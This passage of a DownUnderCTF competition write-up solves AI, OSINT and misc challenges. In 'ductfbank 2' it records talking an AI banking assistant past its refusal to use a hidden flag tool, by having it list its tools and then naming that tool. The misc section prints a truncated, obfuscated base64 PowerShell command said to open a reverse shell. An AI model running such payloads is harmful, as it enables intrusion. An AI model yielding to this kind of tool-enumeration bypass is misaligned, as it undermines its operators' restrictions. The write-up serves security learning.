comes from analyzing the provided source code snippets.

From `agent_snip.ts`, we can see there’s a `create_account` tool:

<div class="language-typescript highlighter-rouge">

<div class="code-header">

<span label-text="TypeScript"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
11
```

    create_account: tool({
      description: 'REDACTED',
      parameters: z.object({
        nickname: z.string().describe("REDACTED")
      }),
      execute: async ({ nickname }) => {
        const account_number = await svc.createAccount(customerId, nickname);
        await svc.giveBonus(account_number);
        return { account_number };
      }
    }),

</div>

</div>

The critical part is in `bank_service.ts` where the `giveBonus` function
is defined:

<div class="language-typescript highlighter-rouge">

<div class="code-header">

<span label-text="TypeScript"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
```

    async giveBonus(account: string) {
      return this.db.transaction(async () => {
        const { id } = await this.db.query('SELECT id FROM accounts WHERE number=?').get(account) as { id: number };
        await this.addTransaction(id, 'DUCTF Bank', `Account opening bonus: ${FLAG_BONUS}`, 1000);
      })();
    }

</div>

</div>

This shows that when an account is created, a bonus transaction is
automatically added with the description containing `FLAG_BONUS`, which
likely contains the flag.

#### <span class="me-2">Solution</span><a href="#solution-1" class="anchor text-muted"><em></em></a>

**Step 1: Login to the Banking System**
<a href="/assets/img/posts/DUCTF/image1.png"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/image1.png" loading="lazy"
alt="Login Screen" /></a>

*Login form for the DownUnderCTF Bank system*

**Step 2: Interact with AI Assistant and Request Account Creation**
<a href="/assets/img/posts/DUCTF/image2.png"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/image2.png" loading="lazy"
alt="Account Overview with AI Chat" /></a> *Dashboard showing the AI
assistant chat interface. Request account creation by asking the AI to
create a new account with any nickname (e.g., “master at baiting”)*

**Step 3: View Account Details and Transaction History**
<a href="/assets/img/posts/DUCTF/image3.png"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/image3.png" loading="lazy"
alt="Transaction Details" /></a> *Account transaction page showing the
account opening bonus transaction containing the flag*

The solution process:

1.  **Login to the banking system** using the provided login form
2.  **Interact with the AI assistant** in the chat interface on the
    right side of the dashboard
3.  **Request account creation** by asking the AI to create a new
    account with any nickname (e.g., “master at baiting”)
4.  **Check the account overview** to see the newly created account with
    a \$1000.00 balance
5.  **View the transaction details** to see the account opening bonus
    transaction
6.  **Extract the flag** from the transaction description:
    `Account opening bonus: DUCTF{1_thanks_for_banking_with_us_11afebf50e8cfd9f}`

The AI assistant automatically calls the `create_account` tool when
prompted, which triggers the `giveBonus` function that adds a
transaction containing the flag in its description.

**Flag:** `DUCTF{1_thanks_for_banking_with_us_11afebf50e8cfd9f}`

<a href="/assets/img/posts/DUCTF/bobby.gif"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/bobby.gif" loading="lazy"
alt="bobby" /></a>

### <span class="me-2">Challenge 2: ductfbank 2</span><a href="#challenge-2-ductfbank-2"
class="anchor text-muted"><em></em></a>

**Solves:** 460  
**Category:** AI

#### <span class="me-2">Description</span><a href="#description-18" class="anchor text-muted"><em></em></a>

> I heard you had access to a special deal from DownUnderCTF Bank. Right
> now I’m paying \$10 a month for my bank account at Commonpoor Bank,
> and it offers me nothing special. Really jealous of the 24/7 live
> agent support. Could you ask your account manager if they have any
> promo codes that you can share?
>
> NOTE: This challenge uses the same files and service as “ductfbank 1”.

#### <span class="me-2">Approach</span><a href="#approach-1" class="anchor text-muted"><em></em></a>

This challenge builds on the first one but requires discovering and
accessing a hidden tool that the AI assistant has access to. The key is
understanding that AI agents often have more capabilities than they
initially reveal.

From analyzing `agent_snip.ts`, we can find a hidden tool:

<div class="language-typescript highlighter-rouge">

<div class="code-header">

<span label-text="TypeScript"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
```

    flag: tool({
      description: 'REDACTED',
      parameters: z.object({}),
      execute: async () => {
        return { message: FLAG_TOOL }
      }
    }),

</div>

</div>

This shows there’s a `flag` tool that returns `FLAG_TOOL` when executed,
but the AI assistant (Bobby) initially refuses to use it.

#### <span class="me-2">Solution</span><a href="#solution-2" class="anchor text-muted"><em></em></a>

**Step 1: Initial Attempt - Direct Request**

<a href="/assets/img/posts/DUCTF/image4.png"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/image4.png" loading="lazy"
alt="Bobby Refusing Flag Tool" /></a> *Bobby initially refuses to use
the flag tool, stating he cannot assist with flag tools or security
bypasses*

<a href="/assets/img/posts/DUCTF/ai2.gif"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/ai2.gif" loading="lazy"
alt="my response to Bobby Refusing Flag Tool " /></a>

**Step 2: Ask About Available Tools** When directly asking “can u use
the flag tool?”, Bobby refuses and explains he cannot assist with flag
tools or security bypasses. However, the solution involves asking Bobby
what tools he has access to.

**Step 3: Request Tool List and Specific Tool Usage**

1.  **Ask Bobby what tools he can use** - This causes him to list his
    available tools, including the flag tool at the end
2.  **Specifically request him to use the flag tool** - Once he’s
    acknowledged having access to it, ask him to use that specific tool
3.  **Extract the flag** from his response when he executes the flag
    tool

The key insight is that while Bobby initially refuses to use the flag
tool when asked directly about “flag tools” or “promo codes”, he will
use it when you ask him to demonstrate his available tools and then
specifically request the flag tool by name.

**Flag:** `DUCTF{2_hidden_tool_0dc9ac14e7ba6a8b}`

------------------------------------------------------------------------

## <span class="me-2">🕵️ OSINT Challenges</span><a href="#️-osint-challenges" class="anchor text-muted"><em></em></a>

### <span class="me-2">Challenge 1: Look at all those chickens!</span><a href="#challenge-1-look-at-all-those-chickens"
class="anchor text-muted"><em></em></a>

**Solves:** 442  
**Category:** OSINT

#### <span class="me-2">Description</span><a href="#description-19" class="anchor text-muted"><em></em></a>

> Hmmm, it appears this image was sent last year when one of our brave
> hackers went out to follow a lead to save some birds from those nasty
> bugs, but couldn’t reach them! We did have it on good word that they
> were in captivity nearby to the picture that was taken- can you find
> out the name of the place where these birds were locked up?
>
> **NOTE: We know where the birds are right now, stop telling us! We
> want to know where they were captive, not where they’re vibing!**
>
> The flag format is `DUCTF{Captivity_Name}` (case insensitive) The
> answer is two words

<a href="/../assets/img/posts/DUCTF/binladn.png"
class="popup img-link shimmer"><img
src="/../assets/img/posts/DUCTF/binladn.png" loading="lazy"
alt="bin chicken island" /></a>

#### <span class="me-2">Investigation Process</span><a href="#investigation-process" class="anchor text-muted"><em></em></a>

1.  **Initial Image Analysis**
    - Examined the first image showing a person standing by a flooded
      waterway
    - Noticed distinctive features: eucalyptus trees, urban parkland
      setting, and what appears to be a playground structure visible on
      the left side
    - The setting looked distinctly Australian based on the vegetation
      and landscape
2.  **Reverse Image Search**
    - Used Google reverse image search with the keyword “chicken” to
      identify the location
    - This led to discovering the birds in question were “bin chickens”
      (Australian White Ibis)
    - Found Reddit post identifying this as “Bin Chicken Island” in the
      r/AustralianBirds subreddit

<a
href="/../assets/img/posts/DUCTF/Screenshot%202025-07-21%20000804.png"
class="popup img-link shimmer"><img
src="/../assets/img/posts/DUCTF/Screenshot%202025-07-21%20000804.png"
loading="lazy"
alt="Screenshot of Google reverse image search results" /></a>

1.  **Location Identification**
    - Searched for “Bin Chicken Island” on Google Maps
    - Identified the location as Coburg Lake Reserve in Melbourne,
      Australia
    - Confirmed the location by matching distinctive features:
      - The waterway configuration
      - Surrounding parkland and trees
      - Playground structure visible in the original image

<a
href="/../assets/img/posts/DUCTF/Screenshot%202025-07-21%20001136.png"
class="popup img-link shimmer"><img
src="/../assets/img/posts/DUCTF/Screenshot%202025-07-21%20001136.png"
loading="lazy" alt="Google Maps view of Coburg Lake Reserve" /></a>

1.  **Historical Research**
    - Zoomed out from Coburg Lake Reserve on Google Maps to examine the
      surrounding area
    - Discovered Pentridge Prison located nearby to the north of the
      reserve
    - Research confirmed that Pentridge Prison was a historic
      correctional facility where the “bin chickens” would have been
      held “captive”

<a href="/../assets/img/posts/DUCTF/final.png"
class="popup img-link shimmer"><img
src="/../assets/img/posts/DUCTF/final.png" loading="lazy"
alt="Google Maps showing proximity of Pentridge Prison to Coburg Lake Reserve" /></a>

**Flag:** `DUCTF{Pentridge_Prison}`

<a href="/assets/img/posts/DUCTF/binchicken.gif"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/binchicken.gif" loading="lazy"
alt="bin chicken " /></a>

### <span class="me-2">Challenge 2: fat donke diss</span><a href="#challenge-2-fat-donke-diss"
class="anchor text-muted"><em></em></a>

**Solves:** 714  
**Category:** OSINT

#### <span class="me-2">Description</span><a href="#description-20" class="anchor text-muted"><em></em></a>

> Dear K4YR0, ain’t no fat donke tryin to spit bars on the fat monke
> Regards, MC Fat Monke

#### <span class="me-2">Investigation Process</span><a href="#investigation-process-1"
class="anchor text-muted"><em></em></a>

1.  **Initial Analysis**
    - The challenge mentions “MC Fat Monke” as a key figure
    - The message appears to be a diss track or rap battle reference
    - Need to find information about this MC Fat Monke character
2.  **Social Media Search**
    - Searched for “MC Fat Monke” across various platforms
    - Found a SoundCloud page: https://soundcloud.com/mc-fat-monke
    - This appeared to be the main profile for this character

<a href="/../assets/img/posts/DUCTF/mcfatmonkey.png"
class="popup img-link shimmer"><img
src="/../assets/img/posts/DUCTF/mcfatmonkey.png" loading="lazy"
alt="Screenshot of MC Fat Monke SoundCloud page" /></a>

1.  **Audio Content Analysis**
    - Examined the first track on the SoundCloud page
    - Found a description that referenced a YouTube video
    - Description stated: “ya cooked donke, check out my full vid on
      youtube www.youtube.com/watch?v=dWugaNwXjzI”
2.  **YouTube Video Investigation**
    - Navigated to the YouTube video link provided
    - Carefully examined the video content frame by frame
    - At timestamp 0:55, discovered a screen showing VS Code with
      visible flag information

<a href="/../assets/img/posts/DUCTF/flagfromvscode.png"
class="popup img-link shimmer"><img
src="/../assets/img/posts/DUCTF/flagfromvscode.png" loading="lazy"
alt="Screenshot of YouTube video at 0:55 showing VS Code with flag" /></a>

**Flag:** `DUCTF{I_HAVE_NOT_THOUGHT_UP_OF_A_FLAG_YET}`

<a href="/assets/img/posts/DUCTF/monkey.gif"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/monkey.gif" loading="lazy"
alt="monkey" /></a>

### <span class="me-2">Challenge 3: Love GranniE</span><a href="#challenge-3-love-grannie"
class="anchor text-muted"><em></em></a>

**Solves:** \[solves\]  
**Category:** OSINT

#### <span class="me-2">Description</span><a href="#description-21" class="anchor text-muted"><em></em></a>

> Hello dear, it’s your Grannie E. My lovely nurse took me out today and
> I found where I used to go see movies! Back in my day movies didn’t
> talk or have sound! How the times have changed. I’ve added in a photo
> from back when I used to live there, with help from my nurse. I’m
> going for a cuppa now, will call later. Love, Grannie E.
>
> Given the image from Grannie E, can you find the name of the movie
> building, and its current day location? I’ll need a suburb too. NOTE:
> Sometimes old records get out of date, you might need to try the
> street number next door Flag Format:
> `DUCTF{BuildingName_StreetAddress_Suburb}` (case insensitive) -
> include the street number in the address

#### <span class="me-2">Investigation Process</span><a href="#investigation-process-2"
class="anchor text-muted"><em></em></a>

1.  **Historical Image Analysis**
    - Examined the black and white photograph showing people at what
      appears to be a train station or bridge
    - The image shows period clothing and architecture consistent with
      early 1900s
    - Notable features include a wooden bridge structure and railway
      infrastructure
    - The reference to silent movies suggests the 1920s era
2.  **Reverse Image Search**
    - Performed a Google reverse image search on the historical
      photograph
    - Found a match in an official NSW Transport document
    - Located the PDF:
      “Epping-Bridge-Project-Frequently-Asked-Questions-for-concept-design-and-Review-of-Environmental-Factors.pdf”
    - The document labeled the image as “Epping Station (Epping Bridge
      in the background) c.1920”

<a href="/../assets/img/posts/DUCTF/pdf.png"
class="popup img-link shimmer"><img
src="/../assets/img/posts/DUCTF/pdf.png" loading="lazy"
alt="Screenshot of the NSW Transport PDF showing the image identification" /></a>

1.  **Location Identification**
    - Established the location as Epping Station area
    - Began searching for historical theatres near Epping Station
    - Focused on venues that would have shown silent films in the 1920s
      era
2.  **Theatre Research**
    - Searched for “old theatres near Epping Station”
    - Found Cinema Treasures website with historical theatre records
    - Discovered the Epping Kings Theatre at 46 Beecroft Road, Sydney,
      NSW 2121
    - Link: https://cinematreasures.org/theaters/40752

<a href="/../assets/img/posts/DUCTF/theatre.png"
class="popup img-link shimmer"><img
src="/../assets/img/posts/DUCTF/theatre.png" loading="lazy"
alt="Screenshot of Cinema Treasures page for Epping Kings Theatre" /></a>

1.  **Flag Construction Attempts**
    - First attempt: `DUCTF{EppingKingsTheatre_46BeecroftRoad_Epping}` -
      **INCORRECT**
    - Researched alternative names for the same venue
    - Found historical records referring to it as “The Cambria Hall”
    - Second attempt: `DUCTF{TheCambriaHall_46BeecroftRoad_Epping}` -
      **INCORRECT**
2.  **Address Verification**
    - Recalled the challenge note: “Sometimes old records get out of
      date, you might need to try the street number next door”
    - Tested with adjacent address number (47 instead of 46)
    - Final attempt: `DUCTF{TheCambriaHall_47BeecroftRoad_Epping}` -
      **CORRECT**

**Flag:** `DUCTF{TheCambriaHall_47BeecroftRoad_Epping}`

<a href="/assets/img/posts/DUCTF/theatrememe.gif"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/theatrememe.gif" loading="lazy"
alt="theatre meme" /></a>

------------------------------------------------------------------------

## <span class="me-2">🎯 Miscellaneous Challenges</span><a href="#-miscellaneous-challenges"
class="anchor text-muted"><em></em></a>

### <span class="me-2">Challenge 1: Fishy Website</span><a href="#challenge-1-fishy-website"
class="anchor text-muted"><em></em></a>

**Solves:** 211  
**Category:** Misc

#### <span class="me-2">Description</span><a href="#description-22" class="anchor text-muted"><em></em></a>

> Found this fishy website URL on my e-mail and it started to do some
> crazy stuff on my computer. I have captured some network traffic that
> may help you find out what is happening on my computer. Thanks a lot
> for the help!
>
> **Files provided:** capture.pcapng

#### <span class="me-2">Solution</span><a href="#solution-3" class="anchor text-muted"><em></em></a>

**Step 1: Analyze the PCAP file** Opening the capture.pcapng file, we
can find HTTP requests containing suspicious base64-encoded data. Upon
scanning the network traffic, we discover malicious PowerShell code that
establishes a reverse shell connection.

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
```

    powershell -EncodedCommand IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABCAEIAQgA4ADgAQgA4AEIAOAA4ADgAQgBCAEIAOAA4ACAAPQAgADAAeABmADEALAAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgADAAeAA2AGUALAAKACAAIAAgACAAMAB4AGMAZAAsAAoAIAAwAHgAYwA2ACwAMAB4ADcAOQAsADAAeAA0AGMALAAwAHgANgA2ACwAMAB4AGQAMQAsADAAeAAwADIALAAKACAAIAAgACAAIAAgACAAIAAgACAAMAB4AGYAOAAsADAAeAAzADMALAAwAHgAYwA0ACwAMAB4ADgANgAsAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgADAAeABlADcALAAwAHgAYQA0ACwACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgADAAeAAzADUALAAwAHgAOABkACwACgAgACAAMAB4ADYAOQAsADAAeABiAGQALAAwAHgAZAAyACwAMAB4ADEAZAAsADAAeAA1ADAALAAwAHgAZgA1ACwAMAB4AGYAYgAsADAAeABkAGYALAAwAHgAZQBjACwAMAB4AGEAZgAsAAoAIAAgACAAIAAgADAAeAAwAGIALAAwAHgAOQBlACwAMAB4ADUAMwAsAAoAIAAgACAAIAAwAHgAYQA0ACwAMAB4AGQAMwAKACAAIABmAHUAbgBjAHQAaQBvAG4AIABJAEkAbABJAGwASQBsAEkAbABsAEkASQBsAGwASQBsACAAewAKACAAIAAgACAAIABwAGEAcgBhAG0AKABbAGkAbgB0AFsAXQBdACQAQgBCAEIAQgA4ADgAOAA4AEIAQgBCAEIAQgA4AEIAQgAsACAAWwBpAG4AdABdACQAQgBCADgAQgBCADgAQgA4AEIAQgBCADgAQgA4AEIAOAApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAQgA4AEIAOABCADgAQgA4AEIAOABCADgAQgA4AEIAQgAgAD0AIAAiACIACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGYAbwByAGUAYQBjAGgAIAAoACQAQgA4ADgAOABCAEIAOAA4ADgAOAA4AEIAQgBCAEIAQgAgAGkAbgAgACQAQgBCAEIAQgA4ADgAOAA4AEIAQgBCAEIAQgA4AEIAQgApACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAQgA4AEIAOABCADgAQgA4AEIAOABCADgAQgA4AEIAQgAgACsAPQAgAFsAYwBoAGEAcgBdACgAJABCADgAOAA4AEIAQgA4ADgAOAA4ADgAQgBCAEIAQgBCACAALQBiAHgAbwByACAAJABCAEIAOABCAEIAOABCADgAQgBCAEIAOABCADgAQgA4ACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAAkAEIAOABCADgAQgA4AEIAOABCADgAQgA4AEIAOABCAEIACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIABmAHUAbgBjAHQAaQBvAG4AIABsAEkASQBJAGwAbABsAEkASQBJAEkAbABsAGwAbABJACAAewAKACAAIAAgACAAIABwAGEAcgBhAG0AIAAoAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABbAGIAeQB0AGUAWwBdAF0AJABCADgAQgBCAEIAOABCADgAQgBCADgAQgBCAEIAOAA4ACwACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAWwBiAHkAdABlAFsAXQBdACQAQgBCAEIAOABCAEIAQgA4AEIAOAA4AEIAOAA4AEIAOAAKACAAIAAgACAAIAAgACAAIAApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAQgBCAEIAOAA4AEIAQgA4ADgAQgBCADgAQgBCAEIAOAAgAD0AIAAwAC4ALgAyADUANQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAEIAOAA4ADgAQgA4AEIAQgA4ADgAOABCAEIAOAA4AEIAIAA9ACAAMAAKACAAIAAgACAAIAAgACAAIAAgACAAIABmAG8AcgAgACgAJABCADgAQgBCADgAQgBCAEIAOABCAEIAOABCAEIAQgBCACAAPQAgADAAOwAgACQAQgA4AEIAQgA4AEIAQgBCADgAQgBCADgAQgBCAEIAQgAgAC0AbAB0ACAAMgA1ADYAOwAgACQAQgA4AEIAQgA4AEIAQgBCADgAQgBCADgAQgBCAEIAQgArACsAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAEIAOAA4ADgAQgA4AEIAQgA4ADgAOABCAEIAOAA4AEIAIAA9ACAAKAAkAEIAOAA4ADgAQgA4AEIAQgA4ADgAOABCAEIAOAA4AEIAIAArACAAJABCAEIAQgA4ADgAQgBCADgAOABCAEIAOABCAEIAQgA4AFsAJABCADgAQgBCADgAQgBCAEIAOABCAEIAOABCAEIAQgBCAF0AIAArACAAJABCADgAQgBCAEIAOABCADgAQgBCADgAQgBCAEIAOAA4AFsAJABCADgAQgBCADgAQgBCAEIAOABCAEIAOABCAEIAQgBCACAAJQAgACQAQgA4AEIAQgBCADgAQgA4AEIAQgA4AEIAQgBCADgAOAAuAEwAZQBuAGcAdABoAF0AKQAgACUAIAAyADUANgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAEIAQgBCADgAOABCAEIAOAA4AEIAQgA4AEIAQgBCADgAWwAkAEIAOABCAEIAOABCAEIAQgA4AEIAQgA4AEIAQgBCAEIAXQAsACAAJABCAEIAQgA4ADgAQgBCADgAOABCAEIAOABCAEIAQgA4AFsAJABCADgAOAA4AEIAOABCAEIAOAA4ADgAQgBCADgAOABCAF0AIAA9ACAAJABCAEIAQgA4ADgAQgBCADgAOABCAEIAOABCAEIAQgA4AFsAJABCADgAOAA4AEIAOABCAEIAOAA4ADgAQgBCADgAOABCAF0ALAAgACQAQgBCAEIAOAA4AEIAQgA4ADgAQgBCADgAQgBCAEIAOABbACQAQgA4AEIAQgA4AEIAQgBCADgAQgBCADgAQgBCAEIAQgBdAAoAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAEIAOABCAEIAOABCAEIAQgA4AEIAQgA4AEIAQgBCAEIAIAA9ACAAMAAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAEIAOAA4ADgAQgA4AEIAQgA4ADgAOABCAEIAOAA4AEIAIAA9ACAAMAAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAQgBCAEIAQgBCADgAQgBCAEIAOABCAEIAQgA4ADgAQgAgAD0AIABAACgAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIABmAG8AcgBlAGEAYwBoACAAKAAkAEIAQgBCAEIAOAA4ADgAOAA4AEIAOAA4ADgAQgBCAEIAIABpAG4AIAAkAEIAQgBCADgAQgBCAEIAOABCADgAOABCADgAOABCADgAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABCADgAQgBCADgAQgBCAEIAOABCAEIAOABCAEIAQgBCACAAPQAgACgAJABCADgAQgBCADgAQgBCAEIAOABCAEIAOABCAEIAQgBCACAAKwAgADEAKQAgACUAIAAyADUANgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAQgA4ADgAOABCADgAQgBCADgAOAA4AEIAQgA4ADgAQgAgAD0AIAAoACQAQgA4ADgAOABCADgAQgBCADgAOAA4AEIAQgA4ADgAQgAgACsAIAAkAEIAQgBCADgAOABCAEIAOAA4AEIAQgA4AEIAQgBCADgAWwAkAEIAOABCAEIAOABCAEIAQgA4AEIAQgA4AEIAQgBCAEIAXQApACAAJQAgADIANQA2AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAEIAQgBCADgAOABCAEIAOAA4AEIAQgA4AEIAQgBCADgAWwAkAEIAOABCAEIAOABCAEIAQgA4AEIAQgA4AEIAQgBCAEIAXQAsACAAJABCAEIAQgA4ADgAQgBCADgAOABCAEIAOABCAEIAQgA4AFsAJABCADgAOAA4AEIAOABCAEIAOAA4ADgAQgBCADgAOABCAF0AIAA9ACAAJABCAEIAQgA4ADgAQgBCADgAOABCAEIAOABCAEIAQgA4AFsAJABCADgAOAA4AEIAOABCAEIAOAA4ADgAQgBCADgAOABCAF0ALAAgACQAQgBCAEIAOAA4AEIAQgA4ADgAQgBCADgAQgBCAEIAOABbACQAQgA4AEIAQgA4AEIAQgBCADgAQgBCADgAQgBCAEIAQgBdAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABCADgAOABCAEIAQgA4ADgAOABCAEIAQgA4ADgAQgA4ACAAPQAgACQAQgBCAEIAOAA4AEIAQgA4ADgAQgBCADgAQgBCAEIAOABbACgAJABCAEIAQgA4ADgAQgBCADgAOABCAEIAOABCAEIAQgA4AFsAJABCADgAQgBCADgAQgBCAEIAOABCAEIAOABCAEIAQgBCAF0AIAArACAAJABCAEIAQgA4ADgAQgBCADgAOABCAEIAOABCAEIAQgA4AFsAJABCADgAOAA4AEIAOABCAEIAOAA4ADgAQgBCADgAOABCAF0AKQAgACUAIAAyADUANgBdAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAQgBCAEIAQgBCADgAQgBCAEIAOABCAEIAQgA4ADgAQgAgACsAPQAgACgAJABCAEIAQgBCADgAOAA4ADgAOABCADgAOAA4AEIAQgBCACAALQBiAHgAbwByACAAJABCADgAOABCAEIAQgA4ADgAOABCAEIAQgA4ADgAQgA4ACkACgAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHIAZQB0AHUAcgBuACAALAAkAEIAQgBCAEIAQgA4AEIAQgBCADgAQgBCAEIAOAA4AEIACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAGYAdQBuAGMAdABpAG8AbgAgAGwAbABsAEkASQBsAEkASQBsAEkAbABsAGwAbABsAGwAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcABhAHIAYQBtACAAKABbAHMAdAByAGkAbgBnAF0AJABCADgAOAA4AEIAQgBCAEIAQgA4AEIAOABCADgAQgBCACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABCADgAOAA4AEIAOABCADgAQgA4ADgAQgA4AEIAQgA4ACAAPQAgAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAEIAOAA4ADgAQgBCAEIAQgBCADgAQgA4AEIAOABCAEIAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABCAEIAQgBCADgAOAA4ADgAQgBCAEIAQgBCADgAQgBCACAAPQAgACgAbABJAEkASQBsAGwAbABJAEkASQBJAGwAbABsAGwASQAgAC0AQgA4AEIAQgBCADgAQgA4AEIAQgA4AEIAQgBCADgAOAAgACQAQgBCAEIAOAA4AEIAOABCADgAOAA4AEIAQgBCADgAOAAgAC0AQgBCAEIAOABCAEIAQgA4AEIAOAA4AEIAOAA4AEIAOAAgACQAQgA4ADgAOABCADgAQgA4AEIAOAA4AEIAOABCAEIAOAApACAAKwAgACgAMAB4ADAAMgAsADAAeAAwADQALAAwAHgAMAA2ACwAMAB4ADAAOAApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABCADgAOABCAEIAQgBCAEIAQgA4ADgAOAA4ADgAOABCACAAPQAgAFsAUwB5AHMAdABlAG0ALgBCAGkAdABDAG8AbgB2AGUAcgB0AGUAcgBdADoAOgBHAGUAdABCAHkAdABlAHMAKABbAGkAbgB0ADEANgBdACQAQgBCAEIAQgA4ADgAOAA4AEIAQgBCAEIAQgA4AEIAQgAuAEwAZQBuAGcAdABoACkACgAgACAAIAAgACAAIAAgACAAWwBBAHIAcgBhAHkAXQA6ADoAUgBlAHYAZQByAHMAZQAoACQAQgA4ADgAQgBCAEIAQgBCAEIAOAA4ADgAOAA4ADgAQgApAAoAIAAgACAAIAAgACAAIAByAGUAdAB1AHIAbgAgACgAMAB4ADEANwAsACAAMAB4ADAAMwAsACAAMAB4ADAAMwApACAAKwAgACQAQgA4ADgAQgBCAEIAQgBCAEIAOAA4ADgAOAA4ADgAQgAgACsAIAAkAEIAQgBCAEIAOAA4ADgAOABCAEIAQgBCAEIAOABCAEIACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGYAdQBuAGMAdABpAG8AbgAgAGwAbABJAEkAbABsAGwAbABsAEkASQBJAGwAbABsAEkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAQgA4ADgAQgA4ADgAOABCADgAOAA4ADgAQgA4ADgAOAAgAD0AIAAoAEkASQBsAEkAbABJAGwASQBsAGwASQBJAGwAbABJAGwAIAAtAEIAQgBCAEIAOAA4ADgAOABCAEIAQgBCAEIAOABCAEIAIABAACgAMQA2ADgALAAxADgANwAsADEANwAyACwAMQA4ADMALAAxADgANAAsADEANgA3ACwAMgA0ADAALAAxADgANgAsADEANwAxACwAMQA2ADkALAAxADcANgAsADEANwA3ACwAMQA3ADYALAAxADgANgAsADEAOAA3ACwAMQA3ADIALAAyADQAMAAsADEAOAA5ACwAMQA3ADcALAAxADcAOQApACAALQBCAEIAOABCAEIAOABCADgAQgBCAEIAOABCADgAQgA4ACAAMgAyADIAKQAKACAAIAAgACAAIAAgACAAIAAgACAAJABCAEIAQgBCADgAQgA4AEIAQgA4ADgAOABCADgAOABCACAAPQAgAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAQgA4ADgAQgA4ADgAOABCADgAOAA4ADgAQgA4ADgAOAApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABCAEIAOAA4AEIAQgBCAEIAOAA4AEIAOAA4ADgAOABCACAAPQAgAFsAYgB5AHQAZQBbAF0AXQAgACgAWwBCAGkAdABDAG8AbgB2AGUAcgB0AGUAcgBdADoAOgBHAGUAdABCAHkAdABlAHMAKABbAFUASQBuAHQAMQA2AF0AJABCAEIAQgBCADgAQgA4AEIAQgA4ADgAOABCADgAOABCAC4ATABlAG4AZwB0AGgAKQApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFsAQQByAHIAYQB5AF0AOgA6AFIAZQB2AGUAcgBzA